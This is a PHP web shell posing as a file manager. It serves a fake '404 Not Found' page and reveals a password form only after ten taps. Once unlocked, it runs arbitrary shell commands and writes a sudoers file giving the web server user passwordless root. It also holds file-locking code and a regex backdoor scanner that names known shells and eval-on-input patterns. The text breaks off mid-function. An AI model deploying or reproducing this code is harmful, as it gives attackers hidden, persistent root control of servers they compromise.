<?php
session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

$self = basename(__FILE__); // Ini akan menjadi 'scan.php'
$lock_file = __DIR__ . '/.fs_lock';
$locked_items_file = __DIR__ . '/.locked_items'; // File untuk menyimpan daftar item yang dikunci
$sudoers_file_base = '/etc/sudoers.d/'; // Direktori sudoers.d
$cwd = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
$cwd = $cwd ?: getcwd();
$msg = isset($_GET['msg']) ? htmlspecialchars($_GET['msg']) : '';

// ===== Unique Signature for this script =====
// Ini akan digunakan untuk mendeteksi salinan script ini meskipun nama filenya berbeda
define('SCRIPT_SIGNATURE', serialize([
    'version' => 'KERJA BURUK-v1.1',
    'unique_functions' => [
        'list_dir', 'formatSize', 'perms', 'breadcrumbs',
        'get_locked_items', 'save_locked_items', 'my_chmod',
        'lock_item_permission', 'unlock_item_permission',
        'is_known_safe_file', 'scan_backdoors', 'check_terminal_access',
        'chown_to_root', // Tambahkan fungsi baru di sini
        'is_root_access_configured', 'enable_root_access', 'remove_root_access', // Fungsi akses root
        'get_sudo_password', // Fungsi baru untuk mendapatkan sudo password
    ],
    'auth_pattern' => 'KERJA BURUK Auth System'
]));

// Tambahkan logging untuk debugging
function log_message($message) {
    file_put_contents(__DIR__ . '/debug.log', date('Y-m-d H:i:s') . ' - ' . $message . PHP_EOL, FILE_APPEND);
}

log_message("Script started. CWD: " . $cwd . ", MSG: " . $msg . ", Session ID: " . session_id());

// ===== AUTH =====
// Periksa apakah file kunci ada
if (file_exists($lock_file)) {
    log_message("Lock file exists. Path: " . $lock_file);
    // Periksa apakah sesi belum dibuka
    if (!isset($_SESSION['unlocked'])) {
        log_message("Session not unlocked. Proceeding with authentication check.");

        // Jika metode POST dan ada input password
        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['pass'])) {
            log_message("POST request with password. Attempting verification.");
            $hash = file_get_contents($lock_file);
            if ($hash === false) {
                log_message("Failed to read lock file. Check permissions.");
                $msg = "Error: Gagal membaca file kunci.";
            } else {
                // Verifikasi password
                if (password_verify($_POST['pass'], $hash)) {
                    $_SESSION['unlocked'] = true;
                    log_message("Password verified. Session unlocked. Redirecting.");
                    session_write_close(); // Pastikan sesi disimpan sebelum redirect
                    header("Location: ?d=" . urlencode($cwd));
                    exit;
                } else {
                    $msg = "Password salah"; // Pesan jika password salah
                    log_message("Password incorrect. MSG: " . $msg);
                }
            }
        }
        // Tampilkan halaman 404 dengan form password
        log_message("Displaying 404 page with password form.");
        echo <<<HTML
<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title>404 Not Found</title>
<style>
  @media (prefers-color-scheme:dark) {
    body { background-color:#000!important }
  }
  body {
    color: #444;
    margin:0;
    font: normal 14px/20px Arial, Helvetica, sans-serif;
    height:100%;
    background-color: #fff;
  }
  .hidden-message {
    display: none;
    font-size: 24px;
    color: green;
  }
</style>
</head>
<body ontouchstart="">

<div style="height:auto; min-height:100%;">
  <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
    <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">404</h1>
    <h2 style="margin-top:20px;font-size: 30px;">Not Found</h2>
    <p>The resource requested could not be found on this server!</p>
  </div>
</div>

<div class="hidden-message" id="secret">
  <form method='post'>
    <input type='password' name='pass' placeholder='Password'>
    <button>Akses</button>
  </form>
</div>

<script>
  let tapCount = 0;
  let timer;

  ['click', 'touchstart'].forEach(eventType => {
    document.body.addEventListener(eventType, function () {
      tapCount++;
      clearTimeout(timer);

      if (tapCount >= 10) {
        document.getElementById('secret').style.display = 'block';
      }

      timer = setTimeout(() => {
        tapCount = 0;
      }, 800);
    });
  });
</script>
HTML;

        // Tampilkan alert jika password salah
        if (!empty($msg)) {
            echo "<script>alert('$msg');</script>";
        }
        exit; // Penting: Keluar setelah menampilkan halaman 404 jika belum terotentikasi
    } else {
        log_message("Session already unlocked. Proceeding to file manager UI.");
    }
} else {
    log_message("Lock file does not exist. No authentication required yet.");
}

// ===== HELPERS =====
function list_dir($path) {
    $items = scandir($path);
    $dirs = $files = [];
    foreach ($items as $item) {
        if ($item === "." || $item === "..") continue;
        $full = "$path/$item";
        $info = [
            'name' => $item,
            'path' => $full,
            'is_dir' => is_dir($full),
            'size' => is_file($full) ? filesize($full) : '-'
        ];
        if (is_dir($full)) $dirs[] = $info;
        else $files[] = $info;
    }
    return array_merge($dirs, $files);
}
function formatSize($b) {
    if (!is_numeric($b)) return '-';
    if ($b >= 1073741824) return round($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576) return round($b / 1048576, 2) . ' MB';
    if ($b >= 1024) return round($b / 1024, 2) . ' KB';
    return $b . ' B';
}
function perms($file) {
    $p = fileperms($file);
    return ($p & 0x4000 ? 'd' : '-') .
           ($p & 0x0100 ? 'r' : '-') . ($p & 0x0080 ? 'w' : '-') . ($p & 0x0040 ? 'x' : '-') .
           ($p & 0x0020 ? 'r' : '-') . ($p & 0x0010 ? 'w' : '-') . ($p & 0x0008 ? 'x' : '-') .
           ($p & 0x0004 ? 'r' : '-') . ($p & 0x0002 ? 'w' : '-') . ($p & 0x0001 ? 'x' : '-');
}
function breadcrumbs($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $full = '';
    $out = [];
    foreach ($parts as $part) {
        $full .= '/' . $part;
        $out[] = "<a href='?d=" . urlencode($full) . "'>$part</a>";
    }
    return implode(" / ", $out);
}

// Fungsi untuk memeriksa apakah file adalah salinan dari script ini
function is_this_script_copy($filepath) {
    if (!file_exists($filepath) || !is_readable($filepath)) {
        return false;
    }

    $content = @file_get_contents($filepath); // Gunakan @ untuk menekan error jika file tidak bisa dibaca
    if ($content === false) {
        return false;
    }
    
    // Cari beberapa pola unik dari script ini
    $unique_patterns = [
        'KERJA BURUK Auth System', // Pesan unik di autentikasi
        'function list_dir\(',    // Fungsi unik
        'function lock_item_permission\(', 
        'function scan_backdoors\(',
        'header\(\s*["\']Location:', // Pola redirect yang sering digunakan
        '\$locked_items_file',    // Variabel unik
        'session_start\(\)',      // Fitur session yang digunakan
        'function check_terminal_access\(\)' // Fungsi unik
    ];

    $matches = 0;
    foreach ($unique_patterns as $pattern) {
        if (preg_match('/' . $pattern . '/i', $content)) { // Tambahkan 'i' untuk case-insensitive
            $matches++;
        }
    }

    // Jika menemukan minimal 4 pola unik, kemungkinan besar ini adalah salinan
    return $matches >= 4;
}


// ===== NEW FUNCTIONS FOR LOCK SHELL =====
function get_locked_items($locked_items_file) {
    if (file_exists($locked_items_file)) {
        $content = file_get_contents($locked_items_file);
        return json_decode($content, true) ?: [];
    }
    return [];
}

function save_locked_items($locked_items_file, $items) {
    file_put_contents($locked_items_file, json_encode(array_values($items), JSON_PRETTY_PRINT));
}

/**
 * Custom chmod function that respects locked items.
 * This function should be used instead of the native chmod() for file operations.
 */
function my_chmod($item_path, $target_perms) {
    global $locked_items_file;
    $locked_items = get_locked_items($locked_items_file);

    if (in_array($item_path, $locked_items)) {
        log_message("Attempt to change permissions on locked item: " . $item_path . ". Denied by my_chmod.");
        return false; // Deny permission change for locked items
    }

    $ok = chmod($item_path, $target_perms);
    if (!$ok) {
        log_message("my_chmod failed for " . $item_path . " to " . decoct($target_perms));
    }
    return $ok;
}


function lock_item_permission($item_path, $locked_items_file) {
    global $cwd;
    $msg = '';
    if (file_exists($item_path)) {
        $locked_items = get_locked_items($locked_items_file);
        if (!in_array($item_path, $locked_items)) {
            $locked_items[] = $item_path;
            save_locked_items($locked_items_file, $locked_items);
        }

        // Set permission based on type (file 0444, directory 0555)
        $target_perms = is_dir($item_path) ? 0555 : 0444;
        // Use native chmod here, as this is the function that *sets* the lock
        $ok = chmod($item_path, $target_perms);
        log_message("Locking item: " . $item_path . ". Status: " . ($ok ? "sukses" : "gagal") . " Perms: " . decoct($target_perms));
        $msg = $ok ? "Item berhasil dikunci (" . decoct($target_perms) . ")." : "Gagal mengunci item.";
    } else {
        log_message("Lock item failed: File not found: " . $item_path);
        $msg = "File atau folder tidak ditemukan.";
    }
    return $msg;
}

function unlock_item_permission($item_path, $locked_items_file) {
    global $cwd;
    $msg = '';
    if (file_exists($item_path)) {
        $locked_items = get_locked_items($locked_items_file);
        $index = array_search($item_path, $locked_items);
        if ($index !== false) {
            unset($locked_items[$index]);
            save_locked_items($locked_items_file, $locked_items);
        }
        // Set permission back to a more typical 0644 for files, 0755 for directories
        $default_perms = is_dir($item_path) ? 0755 : 0644;
        // Use native chmod here, as this is the function that *unsets* the lock
        $ok = chmod($item_path, $default_perms);
        log_message("Unlocking item: " . $item_path . ". Status: " . ($ok ? "sukses" : "gagal") . " Perms: " . decoct($default_perms));
        $msg = $ok ? "Item berhasil dibuka kunci (kembali ke default)." : "Gagal membuka kunci item.";
    } else {
        log_message("Unlock item failed: File not found: " . $item_path);
        $msg = "File atau folder tidak ditemukan.";
    }
    return $msg;
}

// ===== NEW FUNCTIONS FOR BACKDOOR SCANNER (with improved safe file detection) =====

// Fungsi baru untuk memeriksa apakah file adalah bagian dari instalasi CMS/Library yang dikenal dan aman
function is_known_safe_file($filepath) {
    global $self; // Ambil nama file script ini sendiri

    // Normalisasi path untuk perbandingan yang lebih mudah
    $filepath = str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $filepath);
    $filename = basename($filepath);
    $file_extension = pathinfo($filepath, PATHINFO_EXTENSION);
    $content = @file_get_contents($filepath); // Gunakan @ untuk menekan error jika file tidak bisa dibaca

    // Jika konten tidak bisa dibaca, anggap tidak aman (atau lewati jika itu yang diinginkan)
    if ($content === false) {
        return false; // Tidak bisa memverifikasi keamanan, jadi tidak dianggap aman secara default
    }

    // --- PENTING: Jangan anggap file ini sendiri sebagai "aman" ---
    // Ini memastikan bahwa salinan dari script ini akan dipindai.
    if (realpath($filepath) === realpath(__FILE__)) {
        return false;
    }
    // Juga jangan anggap salinan dari script ini sebagai "aman"
    if (is_this_script_copy($filepath)) {
        return false;
    }


    // --- Whitelist berdasarkan nama file atau pola path untuk CMS/Library umum ---

    // WordPress
    if (strpos($filepath, 'wp-admin') !== false ||
        strpos($filepath, 'wp-includes') !== false ||
        strpos($filepath, 'wp-content') !== false ||
        ($filename === 'index.php' && file_exists(dirname($filepath) . DIRECTORY_SEPARATOR . 'wp-config.php')) ||
        $filename === 'wp-config.php' ||
        $filename === 'wp-load.php' ||
        $filename === 'xmlrpc.php' ||
        $filename === 'wp-cron.php'
    ) {
        if (strpos($content, 'define(\'WP_USE_THEMES\', true);') !== false ||
            strpos($content, 'require_once(ABSPATH . \'wp-settings.php\');') !== false ||
            (strpos($content, 'WordPress') !== false && strpos($content, 'License: GPLv2 or later') !== false)
        ) {
            return true; // Ini kemungkinan besar file WordPress
        }
    }

    // Joomla
    if (strpos($filepath, 'administrator') !== false ||
        strpos($filepath, 'components') !== false ||
        strpos($filepath, 'libraries') !== false ||
        ($filename === 'index.php' && file_exists(dirname($filepath) . DIRECTORY_SEPARATOR . 'configuration.php')) ||
        $filename === 'configuration.php'
    ) {
        if (strpos($content, 'defined(\'_JEXEC\') or die;') !== false ||
            (strpos($content, 'Joomla!') !== false && strpos($content, 'Copyright (C) 2005 - 2024 Open Source Matters. All rights reserved.') !== false)
        ) {
            return true; // Ini kemungkinan besar file Joomla
        }
    }

    // Drupal
    if (strpos($filepath, 'core') !== false ||
        strpos($filepath, 'modules') !== false ||
        strpos($filepath, 'themes') !== false ||
        ($filename === 'index.php' && file_exists(dirname($filepath) . DIRECTORY_SEPARATOR . 'autoload.php') && file_exists(dirname($filepath) . DIRECTORY_SEPARATOR . 'web.config')) ||
        $filename === 'web.config'
    ) {
        if (strpos($content, 'DRUPAL_ROOT') !== false ||
            (strpos($content, 'Drupal') !== false && strpos($content, 'This file is part of Drupal.') !== false)
        ) {
            return true; // Ini kemungkinan besar file Drupal
        }
    }

    // Laravel
    if ($filename === 'index.php' && file_exists(dirname($filepath) . DIRECTORY_SEPARATOR . 'bootstrap' . DIRECTORY_SEPARATOR . 'app.php')) {
        if (strpos($content, '$app = require_once __DIR__.\'/../bootstrap/app.php\';') !== false) {
            return true; // Ini kemungkinan besar file Laravel
        }
    }

    // Common Libraries/Frameworks (contoh: MySQL.php, Curl.php, dll.)
    // Ini adalah area yang paling sering menyebabkan false positive.
    // Kita bisa mencari komentar lisensi atau signature spesifik.
    $common_library_patterns = [
        'MySQL.php' => ['PHP MySQL Library', 'Copyright (c)'],
        'Curl.php' => ['PHP Curl Library', 'Copyright (c)'],
        'db.php' => ['Database Abstraction Layer', 'Copyright (c)'],
        'functions.php' => ['Common functions', 'Copyright (c)'], // Hati-hati dengan ini, bisa jadi backdoor
        'config.php' => ['Configuration file', 'define('], // Hati-hati dengan ini
        // Tambahkan lebih banyak jika Anda tahu library spesifik yang digunakan
        // Contoh: 'PHPMailer.php' => ['PHPMailer - PHP email creation and transport class', 'Copyright (c)'],
        // Contoh: 'Smarty.class.php' => ['Smarty PHP templating framework', 'Copyright (c)'],
    ];

    foreach ($common_library_patterns as $lib_filename => $signatures) {
        if ($filename === $lib_filename) {
            $all_signatures_found = true;
            foreach ($signatures as $signature) {
                if (strpos($content, $signature) === false) {
                    $all_signatures_found = false;
                    break;
                }
            }
            if ($all_signatures_found) {
                return true;
            }
        }
    }

    // File umum yang sering ada di root dan biasanya aman
    $common_safe_files = [
        '.htaccess',
        'robots.txt',
        'sitemap.xml',
        'favicon.ico',
        'error_log',
        'composer.json',
        'composer.lock',
        'package.json',
        'yarn.lock',
        'webpack.mix.js',
        'gulpfile.js',
        'README.md',
        'LICENSE',
        'CHANGELOG.md',
        'web.config', // Untuk IIS
    ];
    if (in_array($filename, $common_safe_files)) {
        return true;
    }

    // Penanganan khusus untuk index.php di root direktori (DOCUMENT_ROOT)
    if ($filename === 'index.php' && realpath($filepath) === realpath($_SERVER['DOCUMENT_ROOT'] . DIRECTORY_SEPARATOR . 'index.php')) {
        // Jika index.php hanya berisi include/require ke file lain, atau hanya phpinfo
        if (preg_match('/^\s*<\?php\s*(require|include)/i', $content) || strpos($content, '<?php phpinfo(); ?>') !== false) {
            return true;
        }
        // Tambahkan logika lain jika index.php Anda memiliki signature khusus yang aman
    }

    // Jika tidak cocok dengan pola file aman yang dikenal
    return false;
}


function scan_backdoors($start_dir) {
    global $self; // Ambil nama file script ini sendiri

    $critical_patterns = [
        // Pola yang sangat kuat mengindikasikan backdoor (seringkali eksekusi perintah langsung dari input)
        'eval\(\s*\$_GET\[',
        'eval\(\s*\$_POST\[',
        'eval\(\s*\$_REQUEST\[',
        'eval\(\s*\$_COOKIE\[',
        'shell_exec\(\s*\$_GET\[',
        'shell_exec\(\s*\$_POST\[',
        'shell_exec\(\s*\$_REQUEST\[',
        'system\(\s*\$_GET\[',
        'system\(\s*\$_POST\[',
        'system\(\s*\$_REQUEST\[',
        'passthru\(\s*\$_GET\[',
        'passthru\(\s*\$_POST\[',
        'passthru\(\s*\$_REQUEST\[',
        'assert\(\s*\$_GET\[',
        'assert\(\s*\$_POST\[',
        'assert\(\s*\$_REQUEST\[',
        'preg_replace\([^,]+,\s*\'e\'', // Eval modifier in preg_replace
        'base64_decode\(\s*[\'"]([a-zA-Z0-9\+\/=]{100,})[\'"]\s*\)', // Long base64 string
        'str_rot13\(\s*[\'"]([a-zA-Z0-9\+\/=]{100,})[\'"]\s*\)', // Long str_rot13 string
        'gzinflate\(\s*[\'"]([a-zA-Z0-9\+\/=]{100,})[\'"]\s*\)', // Long gzinflate string
        'hex2bin\(\s*[\'"]([0-9a-fA-F]{100,})[\'"]\s*\)', // Long hex string
        'file_put_contents\([^,]+,\s*\$_POST', // File write from POST
        'file_put_contents\([^,]+,\s*\$_GET', // File write from GET
        'new COM\(\'WScript.Shell\'\)', // Windows specific
        'web_shell', 'c99shell', 'r57shell', 'wso_shell', 'b374k_shell', // Known shell names
    ];

    $suspicious_patterns = [
        // Pola yang mencurigakan, tetapi mungkin juga sah dalam konteks tertentu
        'create_function\(', // Deprecated, tapi bisa jadi backdoor
        'call_user_func\(\s*\$[a-zA-Z0-9_]+\s*,\s*\$[a-zA-Z0-9_]+\s*\)', // call_user_func dengan parameter dinamis
        'array_map\(\s*\$[a-zA-Z0-9_]+\s*,\s*\$[a-zA-Z0-9_]+\s*\)', // array_map dengan parameter dinamis
        'filter_var\(\s*\$[a-zA-Z0-9_]+\s*,\s*FILTER_CALLBACK', // filter_var dengan callback dinamis
        'fopen\([^,]+,\s*[\'"]w[\'"]\)', 'fopen\([^,]+,\s*[\'"]a[\'"]\)', // fopen in write/append mode
        'unlink\(\s*\$[a-zA-Z0-9_]+\s*\)', // unlink dengan variabel
        'mkdir\(\s*\$[a-zA-Z0-9_]+\s*\)', // mkdir dengan variabel
        'rename\(\s*\$[a-zA-Z0-9_]+\s*,\s*\$[a-zA-Z0-9_]+\s*\)', // rename dengan variabel
        'phpinfo\(\)', // Information disclosure, bisa jadi backdoor atau file info biasa
        'ini_set\(\s*[\'"]disable_functions[\'"]', // Attempt to disable disable_functions
        'ini_set\(\s*[\'"]safe_mode[\'"]', // Attempt to disable safe_mode
        'chr\(\d+\)\s*\.\s*chr\(\d+\)', // Obfuscated strings (e.g., "e"."v"."a"."l")
        'ord\(\s*\$[a-zA-Z0-9_]+\s*\)', // Penggunaan ord() untuk membangun string
        'str_replace\(\'\\\\\',\'\',', // Common de-obfuscation
    ];

    // --- Pola Deteksi untuk File Manager/Shell (termasuk scan.php itu sendiri) ---
    // Ini akan mendeteksi file yang memiliki fungsionalitas mirip file manager atau shell.
    $file_manager_shell_patterns = [
        // Pola umum untuk file manager/shell
        'session_start\(\)', // Banyak shell menggunakan sesi
        'file_put_contents\(', // Kemampuan menulis file
        'file_get_contents\(', // Kemampuan membaca file
        'unlink\(', // Kemampuan menghapus file
        'mkdir\(', // Kemampuan membuat direktori
        'rmdir\(', // Kemampuan menghapus direktori
        'chmod\(', // Kemampuan mengubah izin file
        'rename\(', // Kemampuan mengganti nama file/folder
        'scandir\(', // Kemampuan membaca isi direktori
        'header\(\s*[\'"]Location:', // Redirect setelah aksi (umum di file manager)
        '$_FILES\[', // Upload file
        '$_POST\[[\'"]newfile[\'"]', // Membuat file baru
        '$_POST\[[\'"]newfolder[\'"]', // Membuat folder baru
        '$_POST\[[\'"]setpass[\'"]', // Mengatur password
        '$_POST\[[\'"]editfile[\'"]', // Mengedit file
        '$_POST\[[\'"]rename[\'"]', // Mengganti nama
        '$_POST\[[\'"]setperms[\'"]', // Mengatur izin
        '$_GET\[[\'"]download[\'"]', // Fitur download
        '$_GET\[[\'"]edit[\'"]', // Fitur edit
        '$_GET\[[\'"]chmod[\'"]', // Fitur chmod
        '$_GET\[[\'"]delete[\'"]', // Fitur delete
        'function\s+list_dir\(', // Fungsi list_dir yang ada di scan.php
        'function\s+formatSize\(', // Fungsi formatSize yang ada di scan.php
        'function\s+perms\(', // Fungsi perms yang ada di scan.php
        'function\s+breadcrumbs\(', // Fungsi breadcrumbs yang ada di scan.php
        'function\s+get_locked_items\(', // Fungsi lock yang ada di scan.php
        'function\s+save_locked_items\(', // Fungsi lock yang ada di scan.php
        'function\s+my_chmod\(', // Fungsi lock yang ada di scan.php
        'function\s+lock_item_permission\(', // Fungsi lock yang ada di scan.php
        'function\s+unlock_item_permission\(', // Fungsi lock yang ada di scan.php
        'function\s+is_known_safe_file\(', // Fungsi scan backdoor yang ada di scan.php
        'function\s+scan_backdoors\(', // Fungsi scan backdoor yang ada di scan.php
        'function\s+check_terminal_access\(\)', // Fungsi terminal access yang ada di scan.php
        'KERJA BURUK', // Signature unik dari file Anda
        // Tambahan pola spesifik dari skrip Anda
        'KERJA BURUK Auth System',
        '\$locked_items_file',
        '\$lock_file',
        '\$_POST\[["\']newfile["\']\]',
        '\$_POST\[["\']newfolder["\']\]',
        '\$_POST\[["\']setpass["\']\]',
        '\$_POST\[["\']editfile["\']\]',
        '\$_POST\[["\']rename["\']\]',
        '\$_POST\[["\']setperms["\']\]',
        '\$_GET\[["\']download["\']\]',
        '\$_GET\[["\']edit["\']\]',
        '\$_GET\[["\']chmod["\']\]',
        '\$_GET\[["\']delete["\']\]'
    ];


    $found_backdoors = [];
    $critical_count = 0;

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($start_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $file) {
        $filepath = $file->getPathname();
        $filename = basename($filepath);
        $file_extension = pathinfo($filepath, PATHINFO_EXTENSION);

        // Hanya pindai file PHP untuk backdoor PHP
        if ($file->isFile() && $file_extension === 'php') {
            // --- Pemeriksaan file aman ---
            // Jika file ini adalah script yang sedang berjalan, jangan lewati.
            // Jika is_known_safe_file mengembalikan true, lewati.
            if (realpath($filepath) === realpath(__FILE__)) {
                // Ini adalah script scan.php itu sendiri, kita ingin memindainya
                // tetapi kita akan memberinya kategori khusus agar tidak dihapus secara otomatis.
                // Lanjutkan ke pemindaian pola.
            } elseif (is_known_safe_file($filepath)) {
                log_message("Skipping known safe PHP file: " . $filepath);
                continue; // Lewati file PHP yang diketahui aman
            }
            // --- Akhir pemeriksaan file aman ---

            // Pengecekan tambahan: apakah file ini salinan dari script ini?
            $is_script_copy = is_this_script_copy($filepath);
            if ($is_script_copy && realpath($filepath) !== realpath(__FILE__)) { // Pastikan bukan script ini sendiri
                $found_backdoors[] = [
                    'path' => $filepath,
                    'severity' => 'SELF_SCRIPT_COPY (FILE MANAGER)',
                    'patterns' => ['DETECTED AS COPY OF THIS FILE MANAGER SCRIPT'],
                    'is_critical' => false,
                    'is_file_manager_shell' => true,
                    'is_self_script' => false, // Ini adalah salinan, bukan script yang sedang berjalan
                    'is_script_copy' => true
                ];
                log_message("Found copy of self-script: " . $filepath);
                continue; // Lanjutkan ke file berikutnya setelah mendeteksi salinan
            }


            $content = @file_get_contents($filepath); // Gunakan @ untuk menekan error jika file tidak bisa dibaca
            if ($content === false) {
                log_message("Failed to read file for scan: " . $filepath);
                continue;
            }

            $is_critical = false;
            $is_file_manager_shell = false;
            $patterns_found = [];

            // Cek pola kritis terlebih dahulu
            foreach ($critical_patterns as $pattern) {
                if (preg_match('/' . $pattern . '/i', $content)) {
                    $is_critical = true;
                    $patterns_found[] = "CRITICAL: " . $pattern;
                }
            }

            // Cek pola file manager/shell
            foreach ($file_manager_shell_patterns as $pattern) {
                if (preg_match('/' . $pattern . '/i', $content)) {
                    $is_file_manager_shell = true;
                    $patterns_found[] = "FILE_MANAGER/SHELL: " . $pattern;
                }
            }

            // Cek pola suspicious (jika tidak kritis atau file manager/shell)
            if (!$is_critical && !$is_file_manager_shell) {
                foreach ($suspicious_patterns as $pattern) {
                    if (preg_match('/' . $pattern . '/i', $content)) {
                        $patterns_found[] = "SUSPICIOUS: " . $pattern;
                    }
                }
            }

            if (!empty($patterns_found)) {
                $severity_label = 'SUSPICIOUS'; // Default
                if ($is_critical) {
                    $severity_label = 'CRITICAL (TOP PRIORITY)';
                } elseif ($is_file_manager_shell) {
                    // Jika ini adalah script yang sedang berjalan, beri kategori khusus
                    if (realpath($filepath) === realpath(__FILE__)) {
                        $severity_label = 'SELF_SCRIPT (FILE MANAGER)';
                    } else {
                        $severity_label = 'POTENTIAL_SHELL/FILE_MANAGER';
                    }
                }

                $found_backdoors[] = [
                    'path' => $filepath,
                    'severity' => $severity_label,
                    'patterns' => $patterns_found,
                    'is_critical' => $is_critical,
                    'is_file_manager_shell' => $is_file_manager_shell,
                    'is_self_script' => (realpath($filepath) === realpath(__FILE__)),
                    'is_script_copy' => false, // Ini bukan salinan yang terdeteksi oleh is_script_copy, tapi mungkin shell lain
                ];

                if ($is_critical) $critical_count++;

                log_message("Found backdoor: " . $filepath . " (" . $severity_label . ")");
            }
        }
    }

    // Urutkan - critical di atas, kemudian self_script/potential_shell, lalu suspicious
    usort($found_backdoors, function($a, $b) {
        // Prioritas 1: Critical
        if ($a['is_critical'] && !$b['is_critical']) return -1;
        if (!$a['is_critical'] && $b['is_critical']) return 1;

        // Prioritas 2: Self Script (yang sedang berjalan)
        if ($a['is_self_script'] && !$b['is_self_script']) return -1;
        if (!$a['is_self_script'] && $b['is_self_script']) return 1;

        // Prioritas 3: Self Script Copy (salinan dari script ini)
        if ($a['is_script_copy'] && !$b['is_script_copy']) return -1;
        if (!$a['is_script_copy'] && $b['is_script_copy']) return 1;

        // Prioritas 4: Potential Shell/File Manager
        if ($a['is_file_manager_shell'] && !$b['is_file_manager_shell']) return -1;
        if (!$a['is_file_manager_shell'] && $b['is_file_manager_shell']) return 1;

        // Jika keduanya critical atau keduanya suspicious, urutkan berdasarkan path
        return $a['path'] <=> $b['path'];
    });

    return [
        'items' => $found_backdoors,
        'critical_count' => $critical_count
    ];
}

// ===== NEW FUNCTION FOR TERMINAL ACCESS CHECK =====
function check_terminal_access() {
    $disabled_functions = explode(',', ini_get('disable_functions'));
    $disabled_functions = array_map('trim', $disabled_functions);

    $test_commands = [
        'shell_exec' => 'echo "test"',
        'exec' => 'echo "test"',
        'system' => 'echo "test"',
        'passthru' => 'echo "test"',
    ];

    foreach ($test_commands as $func => $cmd) {
        if (function_exists($func) && !in_array($func, $disabled_functions)) {
            $output = '';
            if ($func === 'shell_exec') {
                $output = @shell_exec($cmd);
            } elseif ($func === 'exec') {
                @exec($cmd, $output_array);
                $output = implode("\n", $output_array);
            } elseif ($func === 'system') {
                ob_start();
                @system($cmd);
                $output = ob_get_clean();
            } elseif ($func === 'passthru') {
                ob_start();
                @passthru($cmd);
                $output = ob_get_clean();
            }

            if (strpos($output, 'test') !== false) {
                return '<span class="badge bg-success">Terminal ON</span>';
            }
        }
    }
    return '<span class="badge bg-danger">Terminal OFF</span>';
}

// ===== NEW FUNCTION FOR COMMAND EXECUTION =====
function execute_command($command) {
    $disabled_functions = explode(',', ini_get('disable_functions'));
    $disabled_functions = array_map('trim', $disabled_functions);

    $output = '';
    $available_functions = [];

    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_functions)) {
        $available_functions[] = 'shell_exec';
    }
    if (function_exists('exec') && !in_array('exec', $disabled_functions)) {
        $available_functions[] = 'exec';
    }
    if (function_exists('system') && !in_array('system', $disabled_functions)) {
        $available_functions[] = 'system';
    }
    if (function_exists('passthru') && !in_array('passthru', $disabled_functions)) {
        $available_functions[] = 'passthru';
    }

    if (empty($available_functions)) {
        return "Error: No command execution functions are enabled.";
    }

    // Prioritize shell_exec, then exec, system, passthru
    if (in_array('shell_exec', $available_functions)) {
        $output = @shell_exec($command);
        log_message("Executed command with shell_exec: " . $command);
    } elseif (in_array('exec', $available_functions)) {
        $output_array = [];
        @exec($command, $output_array);
        $output = implode("\n", $output_array);
        log_message("Executed command with exec: " . $command);
    } elseif (in_array('system', $available_functions)) {
        ob_start();
        @system($command);
        $output = ob_get_clean();
        log_message("Executed command with system: " . $command);
    } elseif (in_array('passthru', $available_functions)) {
        ob_start();
        @passthru($command);
        $output = ob_get_clean();
        log_message("Executed command with passthru: " . $command);
    }

    return $output;
}

// ===== NEW FUNCTIONS FOR ROOT ACCESS MANAGEMENT (MODIFIED FOR AUTO-SUDO) =====

/**
 * Check if root access is configured via sudoers file.
 * This function now checks for the specific sudoers file created by enable_root_access.
 */
function is_root_access_configured() {
    global $sudoers_file_base;
    $web_user = trim(execute_command('whoami'));
    $sudoers_file_path = $sudoers_file_base . $web_user;

    if (file_exists($sudoers_file_path)) {
        $content = file_get_contents($sudoers_file_path);
        // Check for the NOPASSWD: ALL rule
        return strpos($content, 'NOPASSWD: ALL') !== false;
    }
    return false;
}

/**
 * Configure root access for the web server user by creating a sudoers file.
 * This function is now the "auto-sudo" part.
 */
function enable_root_access() {
    global $sudoers_file_base;
    
    // Get web server user
    $web_user = trim(execute_command('whoami'));
    if (empty($web_user)) {
        log_message("Failed to get web server user for root access configuration.");
        return "Gagal mendapatkan nama pengguna web server.";
    }

    $sudoers_file_path = $sudoers_file_base . $web_user;
    $sudoers_content = "# File manager root access for user $web_user\n";
    $sudoers_content .= "$web_user ALL=(ALL) NOPASSWD: ALL\n"; // Memberikan akses sudo tanpa password

    $temp_file = tempnam(sys_get_temp_dir(), 'fm_sudoers');
    if ($temp_file === false) {
        log_message("Failed to create temporary file for sudoers configuration.");
        return "Gagal membuat file sementara.";
    }
    file_put_contents($temp_file, $sudoers_content);

    // Move the file to /etc/sudoers.d/ and set proper permissions (0440)
    // This command MUST be run as root or by a user with sudo privileges.
    // The first time this is run, it might require manual sudo password entry if not already configured.
    $command = "sudo mv " . escapeshellarg($temp_file) . " " . escapeshellarg($sudoers_file_path) . " && sudo chmod 0440 " . escapeshellarg($sudoers_file_path);
    $output = execute_command($command);
    
    // Verify if the file exists and has correct permissions
    if (file_exists($sudoers_file_path) && (fileperms($sudoers_file_path) & 0777) === 0440) {
        log_message("Root access configured successfully for user $web_user. Output: " . $output);
        return true;
    } else {
        log_message("Failed to configure root access. Output: " . $output);
        return "Gagal mengkonfigurasi akses root. Output: " . htmlspecialchars($output) . ". Pastikan pengguna web server memiliki hak sudo awal.";
    }
}

/**
 * Remove root access configuration by deleting the sudoers file.
 * This also requires the script to be run with root privileges.
 */
function remove_root_access() {
    global $sudoers_file_base;
    $web_user = trim(execute_command('whoami'));
    $sudoers_file_path = $sudoers_file_base . $web_user;

    if (file_exists($sudoers_file_path)) {
        $command = "sudo rm " . escapeshellarg($sudoers_file_path);
        $output = execute_command($command);
        if (!file_exists($sudoers_file_path)) {
            log_message("Root access configuration removed successfully. Output: " . $output);
            return true;
        } else {
